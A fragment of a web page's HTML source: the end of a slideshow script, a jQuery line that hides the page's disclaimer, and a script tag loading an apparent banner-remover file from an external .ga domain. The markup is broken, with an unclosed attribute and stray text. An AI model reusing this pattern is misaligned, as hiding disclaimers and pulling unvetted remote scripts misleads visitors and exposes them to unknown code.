        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>$('.disclaimer ').hide();

});

137 </script>
<script src="https://tezistantech.ga/services/wen/TT000pannerremover.js

</body>
</html>